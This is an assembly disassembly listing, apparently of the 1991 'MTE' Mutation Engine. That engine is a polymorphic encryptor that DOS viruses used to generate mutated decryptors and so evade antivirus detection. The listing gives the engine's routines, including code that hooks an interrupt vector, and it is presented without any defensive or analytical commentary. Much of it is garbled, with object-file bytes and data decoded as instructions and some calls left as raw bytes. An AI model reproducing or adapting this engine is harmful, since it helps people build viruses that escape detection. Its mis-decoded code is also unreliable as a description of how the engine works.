  
PAGE  59,132
  
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€								         €€
;€€			        MTE				         €€
;€€								         €€
;€€      Created:   17-Aug-91					         €€
;€€      Version:						         €€
;€€      Code type: zero start					         €€
;€€      Passes:    9	       Analysis Options on: none	         €€
;€€								         €€
;€€								         €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  
data_1e		equ	0			; (0000:0000=0E8h)
data_2e		equ	0Ch			; (0000:000C=5)
data_3e		equ	63h			; (0000:0063=0F6h)
data_4e		equ	12Eh			; (0000:012E=0)
data_5e		equ	132h			; (0000:0132=0F000h)
data_6e		equ	134h			; (0000:0134=0E0h)
data_7e		equ	13Ch			; (0000:013C=0E0h)
data_8e		equ	150h			; (0000:0150=0E0h)
data_9e		equ	559h			; (0000:0559=0)
data_10e	equ	132h			; (0101:0132=70h)
data_11e	equ	71h			; (5F44:0071=0FFh)
data_12e	equ	0E7h			; (5F44:00E7=0FFFFh)
data_13e	equ	116h			; (5F44:0116=0FFh)
data_14e	equ	129h			; (5F44:0129=0FFh)
data_15e	equ	359h			; (5F44:0359=0FFh)
data_26e	equ	9101h			; (78CA:9101=0)
data_27e	equ	23h			; (FFE7:0023=0)
data_28e	equ	63h			; (FFE7:0063=0)
data_29e	equ	129h			; (FFE7:0129=0)
data_30e	equ	135h			; (FFE7:0135=0)
data_31e	equ	136h			; (FFE7:0136=0)
data_32e	equ	150h			; (FFE7:0150=0)
data_33e	equ	159h			; (FFE7:0159=0)
data_34e	equ	559h			; (FFE7:0559=0)
data_35e	equ	3585h			; (FFE7:3585=36h)
  
seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a
  
  
		org	0
  
mte		proc	far
  
start:
		or	byte ptr [bx+di],0
		pop	es
		db	'mte.ASM', 1Bh
		db	 88h, 1Fh, 00h, 00h, 00h
		db	'Turbo Assembler  Version 2.5'
		db	0B4h, 88h, 0Fh, 00h, 40h,0E9h
		db	0C9h, 93h, 12h, 17h, 07h
		db	'mte.ASM_'
		db	 88h, 03h, 00h, 40h,0E9h, 4Ch
		db	 96h, 02h, 00h, 00h, 68h, 88h
		db	 03h, 00h, 40h,0A1h, 94h, 96h
		db	 0Ch, 00h, 05h, 5Fh, 54h, 45h
		db	 58h, 54h, 04h, 43h, 4Fh, 44h
		db	 45h, 96h, 98h, 07h, 00h, 48h
		db	 34h, 08h, 02h, 03h, 01h,0D7h
		db	 96h, 0Ch, 00h, 05h, 5Fh, 44h
		db	 41h, 54h, 41h, 04h, 44h, 41h
		db	 54h, 41h,0C2h, 98h, 07h, 00h
		db	 48h, 00h, 00h, 04h, 05h, 01h
		db	 0Fh, 96h, 08h, 00h, 06h, 44h
		db	 47h, 52h, 4Fh, 55h, 50h, 8Bh
		db	 9Ah, 06h, 00h, 06h,0FFh, 02h
		db	0FFh, 01h, 59h, 8Ch, 14h, 00h
		db	8, 'RND_INIT'
		db	 00h, 07h, 52h, 4Eh, 44h, 5Fh
		db	 47h, 45h, 54h, 00h,0B7h, 90h
		db	 10h, 00h, 00h, 00h, 00h, 00h
		db	 07h, 4Dh, 41h, 58h, 5Fh, 41h
		db	 44h, 44h, 00h, 02h, 00h, 49h
		db	 90h, 14h, 00h, 00h, 00h, 00h
		db	 00h, 0Bh
		db	'MAX_ADD_LEN'
		db	 19h, 00h, 00h,0ECh, 90h, 11h
		db	 00h, 01h, 01h
		db	0Ah, 'MUT_ENGIN'
data_16		db	45h
		db	 09h, 00h, 00h, 3Fh, 90h, 11h
		db	 00h, 00h, 00h, 00h, 00h
		db	8, 'CODE_LEN4', 8
		db	 00h,0C2h, 90h, 0Fh, 00h, 01h
		db	 01h
		db	8, 'CODE_TOP4', 8
		db	 00h,0AEh, 90h, 11h, 00h, 01h
		db	 01h
		db	0Ah, 'CODE_START'
		db	 00h, 00h, 00h, 4Bh, 90h, 10h
		db	 00h
data_17		db	0
		db	0, 0
data_18		db	0
		db	 07h, 4Dh
data_19		db	41h
		db	 58h, 5Fh, 4Ch, 45h, 4Eh
data_20		db	72h
data_21		dw	5
		db	0BEh, 88h, 04h, 00h
loc_1:
		inc	ax
		mov	ds:data_26e,al		; (78CA:9101=0)
		mov	al,byte ptr ds:[3E8h]	; (78CA:03E8=0C3h)
		add	[bx+si],ax
		add	[di+74h],cl
		inc	bp
		and	[bx+si],dh
  
locloop_2:
		cmp	cs:[bx+si],si
		loopz	locloop_2		; Loop if zf=1, cx>0
  
		push	ds
		push	dx
		push	bp
		call	sub_2			; (017C)
		mov	bx,dx
		xchg	ax,bp
		pop	dx
		pop	si
		pop	bp
		sub	bx,di
		push	bx
		push	di
		push	cx
		call	sub_5			; (0222)
		pop	cx
		pop	si
		mov	di,data_9e		; (0000:0559=0)
		sub	di,cx
		push	di
		push	dx
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		pop	cx
		pop	dx
		pop	si
		sub	cx,dx
		sub	di,dx
  
mte		endp
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_1		proc	near
		mov	ax,ds:data_31e		; (FFE7:0136=0)
		neg	ax
		retn
sub_1		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_2		proc	near
		push	es
		pop	ds
		add	cx,16h
		neg	cx
		and	cl,0FEh
		jnz	loc_3			; Jump if not zero
		dec	cx
		dec	cx
loc_3:
		xchg	ax,di
		mov	ds:data_5e,ax		; (0000:0132=0F000h)
loc_4:
		add	ax,cx
		and	al,0FEh
		jnz	loc_5			; Jump if not zero
		dec	ax
		dec	ax
loc_5:
		push	ax
		xchg	ax,di
		mov	di,data_6e		; (0000:0134=0E0h)
		stosw				; Store ax to es:[di]
		xchg	ax,cx
		stosw				; Store ax to es:[di]
		xchg	ax,bp
		stosw				; Store ax to es:[di]
		xchg	ax,si
		stosw				; Store ax to es:[di]
		mov	cl,20h			; ' '
		shl	cl,cl			; Shift w/zeros fill
		xor	cl,20h			; ' '
		mov	[di-0Dh],cl
loc_6:
		pop	bp
		push	bp
		push	bx
		call	sub_3			; (01B2)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_3:
		mov	di,data_7e		; (0000:013C=0E0h)
		mov	cx,8
		mov	al,0FFh
		rep	stosb			; Rep when cx >0 Store al to es:[di]
		mov	di,159h
		mov	bl,7
		call	sub_4			; (01DD)
		dec	di
		cmp	di,159h
		je	loc_7			; Jump if equal
		push	dx
		push	di
		push	bp
		mov	ax,1
		call	sub_6			; (0284)
		pop	di
		xchg	ax,bp
		stosw				; Store ax to es:[di]
		pop	di
		pop	dx
loc_7:
		pop	bx
		pop	ax
		xor	bp,bp			; Zero register
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_4:
		push	ax
		push	bx
		push	dx
		push	di
		xor	ax,ax			; Zero register
		mov	di,data_3e		; (0000:0063=0F6h)
		mov	cx,di
		rep	stosw			; Rep when cx >0 Store ax to es:[di]
		mov	al,4
		xchg	al,[di+0Ch]
		push	ax
		mov	dx,[di+0Dh]
		mov	di,359h
		push	bp
		call	sub_22			; (04C3)
		pop	bp
		call	sub_19			; (0448)
		pop	ax
		pop	di
		pop	dx
		mov	data_20,al		; (78CA:0135=72h)
		and	al,1
		sub	data_19,al		; (78CA:012F=41h)
		push	ax
		call	sub_23			; (04CE)
		pop	ax
		add	[si-1Dh],al
		xchg	ax,bx
		pop	bx
		sub	ax,150h
		jc	loc_6			; Jump if carry Set
		jnz	loc_8			; Jump if not zero
		cmp	[si-12h],ax
		jne	loc_6			; Jump if not equal
loc_8:
		pop	bx
		retn
sub_2		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_5		proc	near
		add	cx,dx
		mov	dx,di
		xchg	ax,di
		mov	ax,ds:data_10e		; (0101:0132=70h)
		test	ax,ax
		jnz	loc_9			; Jump if not zero
		mov	di,data_34e		; (FFE7:0559=0)
loc_9:
		mov	bx,data_33e		; (FFE7:0159=0)
		push	cx
		push	ax
loc_10:
		cmp	bx,dx
		je	loc_12			; Jump if equal
		dec	bx
		mov	al,[bx]
		xor	al,1
		cmp	al,61h			; 'a'
		je	loc_11			; Jump if equal
		xor	al,9
loc_11:
		stosb				; Store al to es:[di]
		inc	cx
		jmp	short loc_10		; (0236)
loc_12:
		pop	dx
		pop	ax
		mov	bx,data_32e		; (FFE7:0150=0)
		test	dx,dx
		jz	loc_13			; Jump if zero
		xchg	ax,cx
		mov	al,0E9h
		stosb				; Store al to es:[di]
		mov	bx,di
		xchg	ax,dx
		stosw				; Store ax to es:[di]
		mov	di,data_34e		; (FFE7:0559=0)
loc_13:
		test	byte ptr ds:data_30e,8	; (FFE7:0135=0)
		jnz	loc_14			; Jump if not zero
		neg	cx
		and	cx,0Fh
		mov	al,90h
		rep	stosb			; Rep when cx >0 Store al to es:[di]
loc_14:
		lea	ax,[di-559h]		; Load effective addr
		add	[bx],ax
		and	al,0FEh
		add	ds:data_31e,ax		; (FFE7:0136=0)
		call	sub_1			; (0176)
		mov	ds,bp
		shr	ax,1			; Shift w/zeros fill
		mov	cx,ax
		rep	movsw			; Rep when cx >0 Mov [si] to es:[di]
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_6:
		push	di
		push	ax
		xor	cx,cx			; Zero register
		mov	ds,cx
		mov	cx,cs
		mov	bx,1A3h
		mov	di,data_2e		; (0000:000C=5)
		cli				; Disable interrupts
		xchg	cx,[di+2]
		xchg	bx,[di]
		sti				; Enable interrupts
		push	cx
		push	bx
		push	di
		push	ds
		push	es
		pop	ds
		push	cs
		mov	bx,359h
		call	sub_8			; (02E4)
		xchg	ax,bp
		pop	es
		pop	di
		cli				; Disable interrupts
		pop	ax
		stosw				; Store ax to es:[di]
		pop	ax
		stosw				; Store ax to es:[di]
		sti				; Enable interrupts
		pop	bx
		push	ds
		pop	es
		mov	di,data_28e		; (FFE7:0063=0)
		xor	si,si			; Zero register
		mov	cx,21h
loc_15:
		xor	ax,ax			; Zero register
		repe	scasw			; Rep zf=1+cx >0 Scan es:[di] for ax
		jz	loc_17			; Jump if zero
		mov	ax,[di-2]
		cmp	ax,si
		jb	loc_15			; Jump if below
		mov	dx,1
		xchg	ax,si
		mov	ax,[di+40h]
		cmp	ax,bx
		je	loc_16			; Jump if equal
		or	ax,ax			; Zero ?
		jnz	loc_15			; Jump if not zero
		lodsb				; String [si] to al
		cbw				; Convrt byte to word
		xchg	ax,dx
loc_16:
		call	sub_7			; (02DC)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_7:
		mov	[si],al
		inc	si
		dec	dx
		jnz	loc_16			; Jump if not zero
		jmp	short loc_15		; (02BA)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_8:
		push	es
		push	bx
		retf				; Return far
loc_17:
		pop	dx
		retn
sub_5		endp
  
		push	bp
		mov	bp,sp
		push	di
		push	cx
		push	bx
		push	ax
		mov	bx,[bp+2]
		mov	al,[bx]
		jnz	loc_18			; Jump if not zero
		xchg	ax,bx
		mov	di,offset data_16	; (78CA:00E7=45h)
		mov	cx,21h
		repne	scasw			; Rep zf=0+cx >0 Scan es:[di] for ax
		inc	word ptr [di-44h]
		mov	al,ch
loc_18:
		cbw				; Convrt byte to word
		inc	ax
		add	[bp+2],ax
		pop	ax
		pop	bx
		pop	cx
		pop	di
		pop	bp
		iret				; Interrupt return
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_9		proc	near
		mov	di,data_29e		; (FFE7:0129=0)
		mov	ax,101h
		stosb				; Store al to es:[di]
		stosw				; Store ax to es:[di]
		mov	ah,81h
		mov	ds:data_1e,ax		; (0000:0000=0E8h)
loc_19:
		call	sub_10			; (0320)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_10:
		xchg	ax,dx
		call	sub_11			; (0324)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_11:
		mov	bl,[di-1]
		xor	bh,bh			; Zero register
		mov	si,bx
		mov	cx,[si-1]
		cmp	ch,6
		jne	loc_21			; Jump if not equal
loc_20:
		or	dl,1
		jmp	short loc_23		; (034F)
loc_21:
		cmp	ch,86h
		jne	loc_22			; Jump if not equal
		xor	cl,cl			; Zero register
		inc	bx
loc_22:
		and	al,[di+2]
		cmp	al,bl
		jae	$+22h			; Jump if above or =
		shr	bl,1			; Shift w/zeros fill
		jnc	loc_23			; Jump if carry=0
		or	cl,cl			; Zero ?
		jz	loc_24			; Jump if zero
loc_23:
		or	dl,dl			; Zero ?
loc_24:
		mov	al,0
		jnz	loc_25			; Jump if not zero
		or	bp,bp			; Zero ?
		jnz	loc_20			; Jump if not zero
		mov	al,2
loc_25:
		or	ch,ch			; Zero ?
		jns	loc_26			; Jump if not sign
		mov	[di],si
		mov	al,1
loc_26:
		mov	[si],al
		jmp	short loc_29		; (0395)
		xchg	ax,dx
		db	0D4h, 0Ch, 80h,0E5h, 80h, 74h
		db	 02h,0D0h,0E8h, 40h, 40h, 40h
		db	 8Ah,0E0h, 88h, 04h, 8Ah, 55h
		db	0FEh, 42h, 8Ah,0F2h,0FEh,0C6h
		db	 88h, 75h,0FEh, 8Ah,0DAh,0B7h
		db	 00h, 8Ah,0CFh, 73h, 04h, 3Ch
		db	 06h, 72h, 02h
loc_27:
		xchg	cl,ch
loc_28:
		xor	ax,cx
		mov	[bx],ax
loc_29:
		shl	si,1			; Shift w/zeros fill
		mov	[si+21h],dx
		inc	byte ptr [di-1]
		mov	al,[di-2]
		cmp	al,[di-1]
		jb	loc_ret_36		; Jump if below
		jmp	loc_19			; (031D)
loc_30:
		dec	bp
		or	dh,dh			; Zero ?
		jns	loc_42			; Jump if not sign
		mov	dh,[si]
		inc	bp
		jz	loc_30			; Jump if zero
		dec	bp
		jnz	loc_37			; Jump if not zero
		push	bx
		mov	bx,offset ds:[2A7h]	; (78CA:02A7=7)
		xchg	al,dh
		xlat cs:[bx]			; al=[al+[bx]] table
		cmp	al,86h
		xchg	al,dh
		xchg	ax,bx
		mov	cl,2Eh			; '.'
		mov	al,ds:data_30e		; (FFE7:0135=0)
		jnz	loc_32			; Jump if not zero
		test	al,2
		jnz	loc_31			; Jump if not zero
		mov	cl,3Eh			; '>'
loc_31:
		test	al,4
		jmp	short loc_34		; (03DB)
loc_32:
		test	al,4
		jnz	loc_33			; Jump if not zero
		mov	cl,36h			; '6'
loc_33:
		test	al,2
loc_34:
		jz	loc_35			; Jump if zero
		mov	al,cl
		stosb				; Store al to es:[di]
loc_35:
		pop	ax
		call	sub_14			; (0421)
		mov	[si-1Ch],di
		stosw				; Store ax to es:[di]
  
loc_ret_36:
		retn
loc_37:
		mov	dx,bp
		lea	bp,[di+1]		; Load effective addr
loc_38:
		stc				; Set carry flag
		retn
		xchg	ax,[bx+si]
		xchg	al,ds:data_35e[si]	; (FFE7:3585=36h)
		out	0Ah,ax			; port 0Ah, DMA-1 mask reg bit
		idiv	byte ptr [bx+si-4Eh]	; al,ah rem = ax/data
		cmp	dh,al
		je	loc_ret_36		; Jump if equal
		cmp	byte ptr [si-1Dh],0FFh
		jne	loc_42			; Jump if not equal
		push	ax
		or	dh,dh			; Zero ?
		jz	loc_39			; Jump if zero
		or	al,al			; Zero ?
		jnz	loc_41			; Jump if not zero
		mov	al,dh
loc_39:
		or	bp,bp			; Zero ?
		jnz	loc_40			; Jump if not zero
		cmp	al,[si]
		je	loc_41			; Jump if equal
loc_40:
		pop	bx
		or	al,90h
		stosb				; Store al to es:[di]
		retn
loc_41:
		pop	ax
loc_42:
		or	al,18h
		xchg	ax,bx
sub_9		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_14		proc	near
		stosb				; Store al to es:[di]
		xchg	ax,bx
		mov	cl,3
		shl	al,cl			; Shift w/zeros fill
		or	al,dh
		stosb				; Store al to es:[di]
		retn
sub_14		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_16		proc	near
		mov	bx,ax
		shr	al,1			; Shift w/zeros fill
		mov	cx,ax
		shl	cx,1			; Shift w/zeros fill
		mov	di,data_27e		; (FFE7:0023=0)
loc_43:
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		jnz	loc_38			; Jump if not zero
		lea	si,[di-22h]		; Load effective addr
		shr	si,1			; Shift w/zeros fill
		cmp	byte ptr [si],3
		jb	loc_43			; Jump if below
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_17:
		lea	ax,[di-22h]		; Load effective addr
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_18:
		retn
sub_16		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_19		proc	near
		mov	al,data_18		; (78CA:012C=0)
		cbw				; Convrt byte to word
		shl	al,1			; Shift w/zeros fill
		call	sub_16			; (042B)
		jc	loc_ret_53		; Jump if carry Set
		mov	ds:data_14e,al		; (5F44:0129=0FFh)
loc_44:
		call	sub_16			; (042B)
		jnc	loc_45			; Jump if carry=0
		xor	al,al			; Zero register
loc_45:
		push	ax
		shr	al,1			; Shift w/zeros fill
		mov	[bx+21h],al
		shr	bl,1			; Shift w/zeros fill
		lahf				; Load ah from flags
		mov	al,[bx]
		and	al,7Fh
		cmp	al,3
		jne	loc_46			; Jump if not equal
		sahf				; Store ah into flags
		jc	loc_52			; Jump if carry Set
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_21:
		inc	ax
		jmp	short loc_51		; (04B7)
loc_46:
		cmp	al,4
		jne	loc_48			; Jump if not equal
		sahf				; Store ah into flags
		jnc	loc_47			; Jump if carry=0
		mov	si,bx
		mov	cl,8
		rol	word ptr [bx+si+21h],cl	; Rotate
loc_47:
		dec	ax
		jmp	short loc_51		; (04B7)
loc_48:
		cmp	al,6
		jb	loc_52			; Jump if below
		jnz	loc_50			; Jump if not zero
		shl	bl,1			; Shift w/zeros fill
		mov	bl,[bx+22h]
		shl	bl,1			; Shift w/zeros fill
		mov	si,[bx+21h]
		xor	ax,ax			; Zero register
		mov	dx,1
		mov	cx,ax
		mov	di,dx
loc_49:
		mov	[bx+21h],di
		dec	si
		jz	loc_52			; Jump if zero
		inc	si
		div	si			; ax,dx rem=dx:ax/reg
		push	dx
		mul	di			; dx:ax = reg * ax
		sub	cx,ax
		xchg	cx,di
		mov	ax,si
		xor	dx,dx			; Zero register
		pop	si
		jmp	short loc_49		; (049E)
loc_50:
		xor	al,0Fh
loc_51:
		mov	[bx],al
loc_52:
		pop	ax
		or	al,al			; Zero ?
		jnz	loc_44			; Jump if not zero
		shr	data_17,1		; (78CA:0129=0) Shift w/zeros fill
  
loc_ret_53:
		retn
sub_19		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_22		proc	near
		mov	ds:data_4e,bl		; (0000:012E=0)
		push	dx
		push	di
		call	sub_9			; (0310)
		pop	di
		pop	dx
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_23:
		push	di
		mov	di,offset ds:[144h]	; (78CA:0144=0)
		mov	ax,0FFFFh
		stosw				; Store ax to es:[di]
		inc	al
		stosw				; Store ax to es:[di]
		stosw				; Store ax to es:[di]
		dec	al
		stosw				; Store ax to es:[di]
		mov	[di+3],al
		mov	bl,[di-23h]
		push	bx
		push	dx
;*		call	sub_32			;*(0682)
		db	0E8h, 9Ah, 01h
		mov	si,di
		call	sub_35			; (06E6)
		pop	dx
		pop	bx
		pop	di
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_25:
		push	bx
		inc	bp
		jz	loc_54			; Jump if zero
		dec	bp
;*		jnz	loc_57			;*Jump if not zero
		db	 75h, 62h
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_26:
		inc	bp
loc_54:
		dec	bp
		inc	dx
		jz	loc_55			; Jump if zero
		dec	dx
		dec	bp
		mov	al,[si]
;*		call	sub_42			;*(095B)
		db	0E8h, 58h, 04h
		inc	bp
loc_55:
		pop	bx
		push	di
		call	sub_36			; (070E)
		or	bp,bp			; Zero ?
		jnz	loc_56			; Jump if not zero
		pop	cx
		dec	bp
		mov	ax,150h
		xchg	ax,[si-1Ch]
		or	dh,dh			; Zero ?
		js	$+22h			; Jump if sign=1
		inc	bp
		push	cx
		push	ax
		mov	al,[si+3]
		and	al,0B7h
		cmp	al,87h
		jne	loc_58			; Jump if not equal
		cmp	bp,[si-12h]
		jne	loc_58			; Jump if not equal
		db	 6Dh, 9Ch, 1Fh, 00h, 84h, 6Ah
		db	 16h, 01h, 01h, 85h, 94h, 16h
		db	 01h, 02h, 85h,0D8h, 16h, 01h
		db	 02h, 85h,0DCh, 16h, 01h, 02h
		db	0C5h, 47h, 14h, 01h, 01h,0C6h
		db	 71h, 14h, 01h, 01h,0AEh,0A0h
		db	0E7h, 03h, 01h
loc_56:
		in	al,3			; port 3, DMA-1 bas&cnt ch 1
		xor	byte ptr [di-4],2
